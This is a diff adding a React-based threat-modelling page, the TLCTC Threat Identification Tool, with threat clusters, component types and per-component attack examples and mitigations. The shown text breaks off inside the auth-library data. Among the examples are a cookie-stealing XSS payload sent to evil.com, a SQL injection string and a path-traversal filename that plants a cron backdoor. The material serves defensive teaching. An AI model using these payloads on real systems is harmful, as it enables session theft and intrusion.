@@ -1,0 +1,2189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TLCTC Threat Identification Tool</title>
+  <script src="/vendor/react/18.3.1/react.production.min.js"></script>
+  <script src="/vendor/react/18.3.1/react-dom.production.min.js"></script>
+  <script src="/vendor/babel/7.26.4/babel.min.js"></script>
+  <script src="/vendor/tailwindcss/3.4.17/tailwind.js"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            slate: {
+              900: '#0f172a', 800: '#1e293b', 700: '#334155', 600: '#475569', 500: '#64748b', 400: '#94a3b8'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: system-ui, -apple-system, sans-serif; transition: background-color 0.2s, color 0.2s; }
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: #f1f5f9; }
+    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+    .dark ::-webkit-scrollbar-track { background: #1e293b; }
+    .dark ::-webkit-scrollbar-thumb { background: #475569; }
+    .dark ::-webkit-scrollbar-thumb:hover { background: #64748b; }
+  </style>
+</head>
+<body>
+  <div id="root"></div>
+  
+  <script type="text/babel">
+    const { useState, useRef, useEffect, useCallback } = React;
+
+    // ============== TLCTC FRAMEWORK DATA ==============
+    const TLCTC_CLUSTERS = {
+      '#1': { id: '#1', name: 'Abuse of Functions', shortName: 'AoF', color: '#3b82f6', description: 'Designed capabilities misused', topology: 'Internal' },
+      '#2': { id: '#2', name: 'Exploiting Server', shortName: 'ExS', color: '#ef4444', description: 'Server-side code flaws', topology: 'Internal' },
+      '#3': { id: '#3', name: 'Exploiting Client', shortName: 'ExC', color: '#f97316', description: 'Client-side code flaws', topology: 'Internal' },
+      '#4': { id: '#4', name: 'Identity Theft', shortName: 'IdT', color: '#eab308', description: 'Credential/session compromise', topology: 'Internal' },
+      '#5': { id: '#5', name: 'Man in the Middle', shortName: 'MitM', color: '#84cc16', description: 'Communication interception', topology: 'Internal' },
+      '#6': { id: '#6', name: 'Flooding Attack', shortName: 'Flood', color: '#06b6d4', description: 'Resource exhaustion', topology: 'Internal' },
+      '#7': { id: '#7', name: 'Malware', shortName: 'Mal', color: '#8b5cf6', description: 'Malicious code execution', topology: 'Internal' },
+      '#8': { id: '#8', name: 'Physical Attack', shortName: 'Phys', color: '#ec4899', description: 'Physical access', topology: 'Bridge' },
+      '#9': { id: '#9', name: 'Social Engineering', shortName: 'SE', color: '#14b8a6', description: 'Human manipulation', topology: 'Bridge' },
+      '#10': { id: '#10', name: 'Supply Chain', shortName: 'SC', color: '#f59e0b', description: 'Third-party trust exploited', topology: 'Bridge' }
+    };
+
+    const VELOCITY_CLASSES = {
+      'VC-1': { id: 'VC-1', name: 'Strategic', range: 'Days-Months', color: '#22c55e' },
+      'VC-2': { id: 'VC-2', name: 'Tactical', range: 'Hours', color: '#eab308' },
+      'VC-3': { id: 'VC-3', name: 'Operational', range: 'Minutes', color: '#f97316' },
+      'VC-4': { id: 'VC-4', name: 'Real-Time', range: 'Seconds', color: '#ef4444' }
+    };
+
+    const RESPONSIBILITY_SPHERES = ['@Org', '@Vendor', '@Supplier', '@CloudProvider', '@MSP', '@Partner', '@Customer', '@User'];
+
+    const COMPONENT_LAYERS = {
+      'infrastructure': { name: 'Infrastructure', color: '#64748b' },
+      'platform': { name: 'Platform/OS', color: '#8b5cf6' },
+      'runtime': { name: 'Runtime', color: '#06b6d4' },
+      'application': { name: 'Application', color: '#22c55e' },
+      'library': { name: 'Library/Dependency', color: '#f59e0b' },
+      'external': { name: 'External', color: '#ec4899' }
+    };
+
+    // COMPONENT_TYPES with comprehensive TLCTC default threats
+    // Logic: #1=AoF (any designed capability), #2=ExS (server-side code), #3=ExC (client-side),
+    //        #4=IdT (credentials), #5=MitM (comms), #6=Flood (resources), #7=Malware (execution),
+    //        #8=Physical, #9=SE (humans), #10=Supply Chain (third-party)
+    const COMPONENT_TYPES = [
+      // Infrastructure: execution environments → #1 (features abused), #6 (resource exhaustion), #7 (malware host)
+      { id: 'vm', name: 'Virtual Machine', layer: 'infrastructure', canContain: true, defaultThreats: ['#1', '#6', '#7'], icon: '🖥️' },
+      { id: 'container', name: 'Container', layer: 'infrastructure', canContain: true, defaultThreats: ['#1', '#6', '#7'], icon: '📦' },
+      { id: 'serverless', name: 'Serverless Function', layer: 'infrastructure', canContain: true, defaultThreats: ['#1', '#2', '#6'], icon: '⚡' },
+      { id: 'host', name: 'Physical Host', layer: 'infrastructure', canContain: true, defaultThreats: ['#1', '#6', '#7', '#8'], icon: '🖥️' },
+      // Platform/OS: #1 (OS features), #2 (kernel/service exploits), #6, #7
+      { id: 'os-linux', name: 'Linux OS', layer: 'platform', defaultThreats: ['#1', '#2', '#6', '#7'], icon: '🐧' },
+      { id: 'os-windows', name: 'Windows OS', layer: 'platform', defaultThreats: ['#1', '#2', '#6', '#7'], icon: '🪟' },
+      { id: 'k8s-pod', name: 'K8s Pod', layer: 'platform', canContain: true, defaultThreats: ['#1', '#6', '#7'], icon: '☸️' },
+      // Runtime: code execution context → #1 (runtime features), #2 (runtime vulns), #7 (executes code)
+      { id: 'runtime-node', name: 'Node.js Runtime', layer: 'runtime', defaultThreats: ['#1', '#2', '#7'], icon: '🟢' },
+      { id: 'runtime-jvm', name: 'JVM', layer: 'runtime', defaultThreats: ['#1', '#2', '#7'], icon: '☕' },
+      { id: 'runtime-python', name: 'Python Runtime', layer: 'runtime', defaultThreats: ['#1', '#2', '#7'], icon: '🐍' },
+      { id: 'runtime-dotnet', name: '.NET Runtime', layer: 'runtime', defaultThreats: ['#1', '#2', '#7'], icon: '🔷' },
+      // Application: server-side → #1 (feature abuse), #2 (code flaws), #4 (auth), #6 (flooding)
+      { id: 'api-endpoint', name: 'API Endpoint', layer: 'application', defaultThreats: ['#1', '#2', '#4', '#6'], icon: '🌐' },
+      { id: 'web-server', name: 'Web Server', layer: 'application', defaultThreats: ['#1', '#2', '#4', '#6'], icon: '🌍' },
+      { id: 'app-logic', name: 'Business Logic', layer: 'application', defaultThreats: ['#1', '#2'], icon: '⚙️' },
+      { id: 'auth-module', name: 'Auth Module', layer: 'application', defaultThreats: ['#1', '#2', '#4'], icon: '🔐' },
+      { id: 'file-handler', name: 'File Handler', layer: 'application', defaultThreats: ['#1', '#2', '#7'], icon: '📁' },
+      { id: 'queue-consumer', name: 'Queue Consumer', layer: 'application', defaultThreats: ['#1', '#2'], icon: '📥' },
+      // Library: third-party → always #10, plus specific risks
+      { id: 'db-client', name: 'DB Client Library', layer: 'library', isThirdParty: true, defaultThreats: ['#2', '#4', '#10'], icon: '📚' },
+      { id: 'http-client', name: 'HTTP Client Library', layer: 'library', isThirdParty: true, defaultThreats: ['#5', '#10'], icon: '📚' },
+      { id: 'auth-library', name: 'Auth Library', layer: 'library', isThirdParty: true, defaultThreats: ['#1', '#4', '#10'], icon: '📚' },
+      { id: 'crypto-library', name: 'Crypto Library', layer: 'library', isThirdParty: true, defaultThreats: ['#10'], icon: '🔒' },
+      { id: 'framework', name: 'Web Framework', layer: 'library', isThirdParty: true, defaultThreats: ['#1', '#2', '#10'], icon: '🏗️' },
+      { id: 'orm', name: 'ORM Library', layer: 'library', isThirdParty: true, defaultThreats: ['#2', '#10'], icon: '📚' },
+      // External services: #1 (service features), #4 (auth), #6 (flooding), #10 (if third-party)
+      { id: 'database', name: 'Database', layer: 'external', defaultThreats: ['#1', '#2', '#4', '#6'], icon: '🗄️' },
+      { id: 'cache', name: 'Cache (Redis)', layer: 'external', defaultThreats: ['#1', '#4', '#6'], icon: '💾' },
+      { id: 'queue', name: 'Message Queue', layer: 'external', defaultThreats: ['#1', '#6'], icon: '📬' },
+      { id: 'storage', name: 'Object Storage', layer: 'external', defaultThreats: ['#1', '#4'], icon: '🪣' },
+      { id: 'idp', name: 'Identity Provider', layer: 'external', isThirdParty: true, defaultThreats: ['#1', '#4', '#9', '#10'], icon: '🔑' },
+      { id: 'third-party-api', name: '3rd Party API', layer: 'external', isThirdParty: true, defaultThreats: ['#1', '#6', '#10'], icon: '🔌' },
+      { id: 'cdn', name: 'CDN', layer: 'external', isThirdParty: true, defaultThreats: ['#5', '#6', '#10'], icon: '🌐' },
+      // Human actors: #9 (SE targets), clients get #3 (client exploitation)
+      { id: 'user', name: 'End User', layer: 'external', defaultThreats: ['#9'], icon: '👤' },
+      { id: 'admin', name: 'Administrator', layer: 'external', defaultThreats: ['#4', '#9'], icon: '👨‍💼' },
+      { id: 'client-browser', name: 'Browser Client', layer: 'external', defaultThreats: ['#3', '#7', '#9'], icon: '🖥️' },
+      { id: 'client-mobile', name: 'Mobile Client', layer: 'external', defaultThreats: ['#3', '#7', '#8', '#9'], icon: '📱' }
+    ];
+
+    // ============== CLUSTER DEFINITIONS (from TLCTC v2.0 Whitepaper) ==============
+    const CLUSTER_DEFINITIONS = {
+      '#1': { genericVuln: 'The inherent trust, scope, and complexity designed into software functionality and configuration.', attackerView: 'I abuse a functionality, not a coding issue.', devView: 'I must understand and constrain the functional domain of my code. Every feature and configuration surface needs explicit boundaries and misuse assumptions.' },
+      '#2': { genericVuln: 'Exploitable flaws within server-side source code implementation and its resulting logic, stemming from insecure coding practices.', attackerView: 'I abuse a flaw in the application\'s source code on the server side.', devView: 'I must apply language-specific secure coding principles for all server-side code.' },
+      '#3': { genericVuln: 'Exploitable flaws within client-role source code implementation, stemming from insecure handling of external data/responses, UI rendering, or client-side state/resources.', attackerView: 'I abuse a flaw in the source code of software acting as a client.', devView: 'I must apply secure coding principles for client-role code and never trust incoming data.' },
+      '#4': { genericVuln: 'Weak binding between identity and authentication artifacts, combined with insufficient credential and session lifecycle controls.', attackerView: 'I abuse credentials to operate as a legitimate identity.', devView: 'I must implement secure credential lifecycle management: storage, transmission, session handling, and robust authentication/authorization.' },
+      '#5': { genericVuln: 'Insufficient end-to-end confidentiality/integrity protection and implicit trust in local networks and intermediate path infrastructure.', attackerView: 'I abuse my position between communicating parties.', devView: 'I must ensure confidentiality and integrity of data in transit: strong E2E protection, proper certificate/path validation.' },
+      '#6': { genericVuln: 'Finite capacity limitations inherent in any system component.', attackerView: 'I abuse the circumstance of always limited capacity in software and systems.', devView: 'I must implement efficient resource management: limits, timeouts, quotas, circuit breakers.' },
+      '#7': { genericVuln: 'The environment\'s intended capability to execute potentially untrusted executable content.', attackerView: 'I abuse the environment\'s designed capability to execute malware code for my purposes.', devView: 'I must control execution paths: allow-listing, code signing/verification, sandboxing.' },
+      '#8': { genericVuln: 'Physical accessibility of infrastructure and the exploitability of physical-layer properties.', attackerView: 'I abuse the physical accessibility or properties of hardware, devices, and signals.', devView: 'I must assume physical access can mean compromise: secure key storage, encryption at rest, tamper evidence.' },
+      '#9': { genericVuln: 'Human psychological factors (trust, fear, urgency, authority bias, curiosity, ignorance, fatigue).', attackerView: 'I abuse human trust and psychology to deceive individuals.', devView: 'I must design interfaces and processes that promote secure behavior: clear indicators, safe defaults.' },
+      '#10': { genericVuln: 'Necessary reliance on, and implicit trust placed in, external suppliers/services and their trust-transfer mechanisms.', attackerView: 'I abuse the target\'s trust in third parties they rely on.', devView: 'I must minimize and compartmentalize third-party trust, harden trust-acceptance points, verify provenance.' }
+    };
+
+    // ============== COMPONENT ROLE HINTS (Axiom II: Client-Server Model) ==============
+    const COMPONENT_ROLE_HINTS = {
+      'api-endpoint': 'server', 'web-server': 'server', 'app-logic': 'server', 'auth-module': 'server',
+      'file-handler': 'server', 'queue-consumer': 'server', 'database': 'server', 'cache': 'server',
+      'queue': 'server', 'storage': 'server', 'idp': 'server', 'third-party-api': 'server', 'cdn': 'server',
+      'serverless': 'server', 'framework': 'server',
+      'client-browser': 'client', 'client-mobile': 'client', 'user': 'client', 'admin': 'client',
+      'db-client': 'client', 'http-client': 'client', 'auth-library': 'client', 'orm': 'client',
+      'vm': 'neutral', 'container': 'neutral', 'host': 'neutral', 'os-linux': 'neutral',
+      'os-windows': 'neutral', 'k8s-pod': 'neutral', 'runtime-node': 'neutral', 'runtime-jvm': 'neutral',
+      'runtime-python': 'neutral', 'runtime-dotnet': 'neutral', 'crypto-library': 'neutral'
+    };
+
+    // ============== THREAT EXAMPLES DATABASE ==============
+    // Maps (componentType, clusterId) → typical implementations, examples, paths, mitigations, MITRE refs
+    const THREAT_EXAMPLES = {
+      'api-endpoint': {
+        '#1': { typicalImpl: 'API rate limit bypass, BOLA/IDOR, parameter manipulation to access unauthorized data, bulk export via legitimate endpoints', example: 'Attacker discovers /api/users/{id} endpoint and iterates through IDs to enumerate all user records using a valid but low-privilege token.', paths: ['#1 → #4 (privilege escalation to credential access)', '#9 → #4 → #1 (phishing → login → feature abuse)'], mitigations: ['RBAC enforcement at API gateway level', 'Object-level authorization checks', 'Rate limiting per user/endpoint', 'Audit logging of sensitive operations'], mitre: ['T1078 Valid Accounts', 'T1530 Data from Cloud Storage'] },
+        '#2': { typicalImpl: 'SQL injection, NoSQL injection, SSRF, deserialization flaws, path traversal, XXE in API parameters', example: 'Attacker sends crafted JSON: {"search": "admin\' OR 1=1--"} to /api/search, bypassing input validation and dumping the users table.', paths: ['#2 → #7 (SQLi to RCE via xp_cmdshell/COPY PROGRAM)', '#2 + [DRE: C] (SQLi data exfiltration)'], mitigations: ['Parameterized queries / prepared statements', 'Input validation and allow-list filtering', 'WAF with injection pattern rules', 'Least-privilege DB accounts'], mitre: ['T1190 Exploit Public-Facing App', 'T1059 Command and Scripting Interpreter'] },
+        '#4': { typicalImpl: 'Stolen API keys, forged JWTs, session hijacking, OAuth token theft, credential stuffing against API auth', example: 'Attacker obtains a leaked API key from a public GitHub repository and uses it to authenticate to the production API with full admin privileges.', paths: ['#9 → #4 (phishing for API credentials)', '#2 → #4 (server exploit leaks tokens)'], mitigations: ['Short-lived tokens with rotation', 'API key scoping and least privilege', 'Secret scanning in CI/CD pipelines', 'MFA for API management'], mitre: ['T1078 Valid Accounts', 'T1528 Steal Application Access Token'] },
+        '#6': { typicalImpl: 'API flooding, computationally expensive queries, regex DoS via API input, connection pool exhaustion', example: 'Attacker sends thousands of complex search queries with deep joins, exhausting database connections and causing API timeouts for all users.', paths: ['#6 + [DRE: A] (direct availability loss)'], mitigations: ['Rate limiting and throttling per client', 'Query complexity limits', 'Circuit breakers and timeouts', 'Auto-scaling with cost limits'], mitre: ['T1498 Network DoS', 'T1499 Endpoint DoS'] }
+      },
+      'web-server': {
+        '#1': { typicalImpl: 'Directory listing enabled, debug endpoints exposed, server status/info pages accessible, default admin panels', example: 'Attacker discovers /server-status is publicly accessible, revealing internal IP addresses, active sessions, and request patterns.', paths: ['#1 → #4 (info disclosure leads to credential discovery)', '#1 → #2 (discovering hidden endpoints to exploit)'], mitigations: ['Disable directory listing and debug modes in production', 'Remove default admin panels', 'Security headers (X-Frame-Options, CSP)'], mitre: ['T1190 Exploit Public-Facing App', 'T1592 Gather Victim Host Info'] },
+        '#2': { typicalImpl: 'Buffer overflow in web server, HTTP request smuggling, header injection, path traversal, SSTI', example: 'Attacker exploits HTTP request smuggling vulnerability to bypass WAF and inject malicious requests directly to the backend application.', paths: ['#2 → #7 (server exploit enables code execution)', '#2 + [DRE: C,I] (data breach via path traversal)'], mitigations: ['Keep web server software patched', 'Harden server configuration', 'Implement request size limits', 'Use modern HTTP/2+ with proper parsing'], mitre: ['T1190 Exploit Public-Facing App', 'T1505.003 Web Shell'] },
+        '#4': { typicalImpl: 'Admin panel credential brute-force, session fixation, cookie theft, default credentials left unchanged', example: 'Attacker finds the admin panel at /admin with default credentials admin:admin still active, gaining full server management access.', paths: ['#4 → #1 (admin access enables feature abuse)', '#4 → #7 (admin uploads webshell)'], mitigations: ['Change all default credentials', 'Enforce strong password policies', 'Implement account lockout', 'Admin panel IP whitelisting'], mitre: ['T1078 Valid Accounts', 'T1110 Brute Force'] },
+        '#6': { typicalImpl: 'HTTP flood, Slowloris attacks, large file upload exhaustion, TLS renegotiation attacks', example: 'Attacker launches a Slowloris attack, opening thousands of partial HTTP connections that exhaust the web server connection pool.', paths: ['#6 + [DRE: A] (service unavailability)'], mitigations: ['Connection timeouts and limits', 'Reverse proxy / CDN with DDoS protection', 'Rate limiting per source IP', 'Minimum request throughput enforcement'], mitre: ['T1498 Network DoS', 'T1499.002 Service Exhaustion Flood'] }
+      },
+      'client-browser': {
+        '#3': { typicalImpl: 'Stored/Reflected/DOM XSS, prototype pollution, CSS injection, browser cache poisoning, WebSocket hijacking', example: 'Attacker injects \x3Cscript\x3Edocument.location="https://evil.com/?c="+document.cookie\x3C/script\x3E into a forum post, stealing session cookies from every visitor.', paths: ['#3 → #4 (XSS steals session token → impersonation)', '#3 → #7 (XSS delivers drive-by download)'], mitigations: ['Content Security Policy (CSP) headers', 'Output encoding / context-aware escaping', 'HttpOnly + Secure + SameSite cookie flags', 'Subresource Integrity (SRI)'], mitre: ['T1189 Drive-by Compromise', 'T1059.007 JavaScript'] },
+        '#7': { typicalImpl: 'Drive-by downloads, malicious browser extensions, cryptojacking scripts, WebAssembly-based malware', example: 'User visits a compromised website that exploits a browser vulnerability to silently download and execute a trojan.', paths: ['#3 → #7 (browser exploit → malware execution)', '#9 → #7 (user tricked into installing malicious extension)'], mitigations: ['Browser auto-update policies', 'Extension whitelisting', 'Sandboxed browsing for high-risk activities', 'Endpoint Detection and Response (EDR)'], mitre: ['T1189 Drive-by Compromise', 'T1176 Browser Extensions'] },
+        '#9': { typicalImpl: 'Phishing pages rendered in browser, fake login forms, misleading download prompts, consent phishing (OAuth)', example: 'User receives email with link to a pixel-perfect clone of their corporate login page, enters credentials which are captured by the attacker.', paths: ['#9 → #4 (phishing captures credentials)', '#9 → #7 (user downloads and runs malicious file)'], mitigations: ['Phishing-resistant MFA (FIDO2/WebAuthn)', 'Email gateway filtering', 'Security awareness training', 'Browser-based phishing protection'], mitre: ['T1566.002 Spearphishing Link', 'T1598 Phishing for Information'] }
+      },
+      'client-mobile': {
+        '#3': { typicalImpl: 'Deep link hijacking, WebView injection, insecure local data handling, intent hijacking, certificate pinning bypass', example: 'Attacker crafts a malicious deep link that exploits a parsing vulnerability in the app\'s WebView, executing JavaScript in the app context.', paths: ['#3 → #4 (mobile exploit steals stored credentials)', '#3 → #7 (exploit leads to code execution on device)'], mitigations: ['Input validation for deep links and intents', 'WebView hardening (disable JS where unnecessary)', 'Certificate pinning', 'Obfuscation and tamper detection'], mitre: ['T1456 Drive-By Compromise (Mobile)', 'T1630 Indicator Removal on Host'] },
+        '#7': { typicalImpl: 'Sideloaded malicious apps, trojanized legitimate apps, mobile RATs, spyware, keyloggers', example: 'User installs a trojanized version of a popular app from a third-party store, which includes a keylogger capturing all banking credentials.', paths: ['#9 → #7 (user tricked into installing malware)', '#10 → #7 (compromised app store / SDK)'], mitigations: ['Only install from official app stores', 'Mobile Device Management (MDM)', 'Runtime Application Self-Protection (RASP)', 'Regular security assessments'], mitre: ['T1444 Masquerade as Legitimate App', 'T1417 Input Capture'] },
+        '#8': { typicalImpl: 'Device theft, USB debugging exploitation, SIM swapping, shoulder surfing, evil maid attacks on mobile', example: 'Attacker steals unlocked phone and accesses banking app with cached credentials before the device auto-locks.', paths: ['#8 → #4 (physical access → credential extraction)', '#8 → #7 (USB debugging → malware installation)'], mitigations: ['Strong device encryption', 'Biometric + PIN authentication', 'Remote wipe capability', 'Auto-lock with short timeout'], mitre: ['T1458 Replication Through Removable Media', 'T1429 Capture Audio'] },
+        '#9': { typicalImpl: 'SMS phishing (smishing), fake app update prompts, push notification social engineering, vishing via mobile', example: 'User receives SMS claiming to be from their bank with a link to "verify their account", leading to a credential harvesting page.', paths: ['#9 → #4 (smishing → credential theft)', '#9 → #7 (user tricked into installing fake update)'], mitigations: ['SMS filtering', 'In-app security notifications (never via SMS links)', 'User education on smishing', 'Number verification for sensitive operations'], mitre: ['T1660 Phishing (Mobile)', 'T1582 SMS Control'] }
+      },
+      'database': {
+        '#1': { typicalImpl: 'Excessive privileges, data export via built-in backup features, schema manipulation, stored procedure abuse', example: 'DBA account with unnecessary permissions exports entire production database using native backup tools to an uncontrolled location.', paths: ['#4 → #1 (stolen DBA credentials → data export)', '#1 → #7 (xp_cmdshell / COPY PROGRAM abuse)'], mitigations: ['Principle of least privilege for DB accounts', 'Audit logging on data export operations', 'Disable dangerous built-in procedures', 'Database Activity Monitoring (DAM)'], mitre: ['T1005 Data from Local System', 'T1565 Data Manipulation'] },
+        '#2': { typicalImpl: 'SQL injection reaching DB engine, stored procedure vulnerabilities, buffer overflow in DB extensions, privilege escalation via DB bugs', example: 'Application-layer SQL injection bypasses parameterization in a legacy ORM, allowing attacker to read password hashes from the users table.', paths: ['#2 → #7 (SQL injection → OS command execution via DB features)', '#2 + [DRE: C,I] (data breach / data manipulation)'], mitigations: ['Parameterized queries enforced at application layer', 'Database firewall / query allow-listing', 'Regular patching of DB engine', 'Network segmentation (no direct DB access from internet)'], mitre: ['T1190 Exploit Public-Facing App', 'T1505 Server Software Component'] },
+        '#4': { typicalImpl: 'Stolen DB connection strings, shared service account credentials, hardcoded passwords in config, credential reuse', example: 'Attacker finds a database connection string with admin credentials in a misconfigured .env file exposed on the web server.', paths: ['#2 → #4 (server exploit → credential discovery → DB access)', '#1 → #4 (config file exposure → credential use)'], mitigations: ['Managed identities / credential vaults (no hardcoded passwords)', 'Unique service accounts per application', 'Connection string encryption', 'Regular credential rotation'], mitre: ['T1078 Valid Accounts', 'T1552 Unsecured Credentials'] },
+        '#6': { typicalImpl: 'Query-of-death, lock table attacks, connection pool exhaustion, storage filling, replication lag exploitation', example: 'Attacker triggers an unoptimized query via the API that performs a full table scan with multiple JOINs, consuming all available DB connections.', paths: ['#6 + [DRE: A] (database unavailability → application outage)'], mitigations: ['Query timeout limits', 'Connection pool sizing and monitoring', 'Query analysis and optimization', 'Read replicas for read-heavy workloads'], mitre: ['T1499 Endpoint DoS', 'T1489 Service Stop'] }
+      },
+      'auth-module': {
+        '#1': { typicalImpl: 'Account enumeration via timing/error differences, password reset flow abuse, MFA bypass via fallback methods, role escalation via permission manipulation', example: 'Attacker exploits the "forgot password" flow to enumerate valid email addresses by observing different response times for existing vs non-existing accounts.', paths: ['#1 → #4 (enumeration → targeted credential attack)', '#9 → #1 (social engineering admin to change auth config)'], mitigations: ['Consistent response times and messages', 'Rate limiting on auth endpoints', 'Secure password reset with verification', 'Least privilege role assignment'], mitre: ['T1078 Valid Accounts', 'T1110 Brute Force'] },
+        '#2': { typicalImpl: 'Authentication bypass via code flaw, JWT signature verification skip, insecure token generation, race condition in session creation', example: 'Attacker discovers the JWT verification library skips signature validation when the algorithm header is set to "none", granting admin access.', paths: ['#2 → #4 (auth bypass → identity impersonation)', '#2 + [DRE: C,I] (unauthorized access to protected resources)'], mitigations: ['Use well-tested auth libraries', 'Enforce algorithm whitelisting for JWT', 'Security code review of auth flows', 'Penetration testing of auth endpoints'], mitre: ['T1548 Abuse Elevation Control Mechanism', 'T1550 Use Alternate Auth Material'] },
+        '#4': { typicalImpl: 'Credential stuffing, password spraying, session hijacking, token replay, Kerberos ticket theft (Golden/Silver tickets)', example: 'Attacker uses credential stuffing with a list of leaked passwords from another breach to log into multiple user accounts.', paths: ['#9 → #4 (phishing → credential use)', '#5 → #4 (MitM captures auth tokens)'], mitigations: ['Phishing-resistant MFA (FIDO2)', 'Credential breach detection', 'Adaptive authentication (risk-based)', 'Session binding to client fingerprint'], mitre: ['T1110.004 Credential Stuffing', 'T1550 Use Alternate Auth Material'] }
+      },
+      'file-handler': {
+        '#1': { typicalImpl: 'Unrestricted file type upload, path traversal in file operations, symlink following, directory traversal via filenames', example: 'Attacker uploads a file named "../../../etc/cron.d/backdoor" exploiting a path traversal to write a cron job that establishes persistence.', paths: ['#1 → #7 (upload legitimate file type that executes)', '#1 + [DRE: I] (overwrite critical files)'], mitigations: ['File type validation (magic bytes, not just extension)', 'Sandboxed file storage (no execution)', 'Filename sanitization', 'Upload size and rate limits'], mitre: ['T1105 Ingress Tool Transfer', 'T1608 Stage Capabilities'] },
+        '#2': { typicalImpl: 'Image parsing vulnerabilities (ImageMagick), archive extraction bombs (zip slip), XML/PDF parser exploits, buffer overflow in file processing', example: 'Attacker uploads a crafted SVG/PNG file that exploits an ImageMagick vulnerability (CVE-like) to achieve remote code execution on the server.', paths: ['#2 → #7 (parser exploit → code execution)', '#2 + [DRE: C] (SSRF via file processing)'], mitigations: ['Disable dangerous ImageMagick coders', 'Process files in isolated sandboxes', 'Validate archive contents before extraction', 'Use memory-safe parsing libraries'], mitre: ['T1203 Exploitation for Client Execution', 'T1027 Obfuscated Files'] },
+        '#7': { typicalImpl: 'Webshell upload, executable disguised as document, macro-enabled document upload, script in uploaded HTML', example: 'Attacker uploads a PHP webshell disguised as a JPEG (with double extension .jpg.php) that gets executed by the web server.', paths: ['#1 → #7 (feature allows upload → malware executes)', '#2 → #7 (bypass validation → malware executes)'], mitigations: ['Execution prevention in upload directories', 'Content-Disposition: attachment headers', 'Antivirus scanning of uploads', 'Store files outside web root'], mitre: ['T1505.003 Web Shell', 'T1204.002 Malicious File'] }
+      },
+      'queue-consumer': {
+        '#1': { typicalImpl: 'Message replay abuse, queue poisoning via legitimate message format, priority manipulation, dead letter queue exploitation', example: 'Attacker replays a valid payment confirmation message multiple times, causing duplicate transactions to be processed.', paths: ['#1 → #4 (queue abuse → elevated processing context)'], mitigations: ['Message deduplication / idempotency keys', 'Message integrity verification (HMAC)', 'Dead letter queue monitoring', 'Strict message schema validation'], mitre: ['T1565 Data Manipulation', 'T1072 Software Deployment Tools'] },
+        '#2': { typicalImpl: 'Deserialization vulnerabilities in message processing, format string bugs, XML/JSON parser exploits in message body', example: 'Attacker injects a crafted serialized Java object into a message queue, exploiting insecure deserialization to execute arbitrary code.', paths: ['#2 → #7 (deserialization exploit → code execution)'], mitigations: ['Avoid native serialization (use JSON/protobuf)', 'Input validation of message payloads', 'Sandboxed message processing', 'Library vulnerability scanning'], mitre: ['T1059 Command and Scripting Interpreter', 'T1190 Exploit Public-Facing App'] }
+      },
+      // Libraries — all get #10 (Supply Chain) by default
+      'db-client': {
+        '#2': { typicalImpl: 'SQL injection via improper query building, connection string injection, ORM bypass vulnerabilities', example: 'Developer uses string concatenation instead of parameterized queries in the DB client library, enabling SQL injection.', paths: ['#2 → #7 (SQL injection → RCE)', '#2 + [DRE: C] (data exfiltration via injection)'], mitigations: ['Always use parameterized queries', 'ORM with built-in injection prevention', 'Static analysis for SQL concatenation patterns'], mitre: ['T1190 Exploit Public-Facing App'] },
+        '#4': { typicalImpl: 'Credential exposure in connection strings, leaked DB passwords in logs, hardcoded credentials in library config', example: 'DB client library logs the full connection string including password at DEBUG level, which gets captured in centralized logging.', paths: ['#4 → #1 (credential use → database abuse)'], mitigations: ['Use credential vaults / managed identities', 'Sanitize connection strings in logs', 'Credential rotation automation'], mitre: ['T1552 Unsecured Credentials'] },
+        '#10': { typicalImpl: 'Compromised DB driver package, backdoored ORM update, dependency confusion attack on DB library', example: 'Attacker publishes a typosquatted version of the popular DB driver (e.g., "mysql2" vs "myslq2") that exfiltrates credentials.', paths: ['#10 → #7 (compromised library executes malicious code)', '#10 → #4 (backdoor captures credentials)'], mitigations: ['Lock dependency versions', 'Use dependency scanning tools (npm audit, Snyk)', 'Verify package checksums', 'Private registry for critical dependencies'], mitre: ['T1195.002 Supply Chain: Software Supply Chain', 'T1059 Command and Scripting Interpreter'] }
+      },
+      'http-client': {
+        '#5': { typicalImpl: 'SSRF via HTTP client, missing certificate validation, downgrade attacks on TLS, proxy misconfiguration', example: 'HTTP client library follows redirects to internal endpoints, enabling SSRF to access metadata services (e.g., cloud IMDS at 169.254.169.254).', paths: ['#5 → #4 (MitM captures auth headers sent by HTTP client)'], mitigations: ['Validate and restrict redirect targets', 'Enforce TLS certificate validation', 'Block requests to internal/metadata IPs', 'Pin certificates for critical endpoints'], mitre: ['T1557 Adversary-in-the-Middle', 'T1090 Proxy'] },
+        '#10': { typicalImpl: 'Compromised HTTP client library, backdoored request middleware, malicious interceptor injection', example: 'Popular HTTP client library (like event-stream incident) is compromised via a malicious contributor, adding code that exfiltrates request data.', paths: ['#10 → #7 (compromised library runs malicious code)', '#10 → #5 (backdoor intercepts all HTTP traffic)'], mitigations: ['Pin dependency versions', 'Review dependency update changelogs', 'Use Software Composition Analysis (SCA)', 'Monitor outbound traffic from applications'], mitre: ['T1195.002 Supply Chain: Software Supply Chain'] }
+      },
+      'auth-library': {
+        '#1': { typicalImpl: 'Insecure defaults in auth library config, permissive token validation, overly broad OAuth scopes', example: 'Auth library ships with token expiry set to 24 hours by default; developer doesn\'t override, leaving long-lived tokens vulnerable to theft.', paths: ['#1 → #4 (misconfigured auth → easy credential exploitation)'], mitigations: ['Review and harden all auth library defaults', 'Enforce short token lifetimes', 'Minimize OAuth scopes', 'Security configuration review checklist'], mitre: ['T1078 Valid Accounts'] },
+        '#4': { typicalImpl: 'JWT algorithm confusion, insecure session handling, weak password hashing, token storage vulnerabilities', example: 'Auth library uses MD5 for password hashing without salt. Leaked database enables rapid offline rainbow table attacks.', paths: ['#4 → #1 (compromised auth → function abuse)'], mitigations: ['Use bcrypt/scrypt/argon2 for password hashing', 'Enforce algorithm whitelisting for JWT', 'Secure token storage (HttpOnly cookies)', 'Regular library updates'], mitre: ['T1110 Brute Force', 'T1550 Use Alternate Auth Material'] },
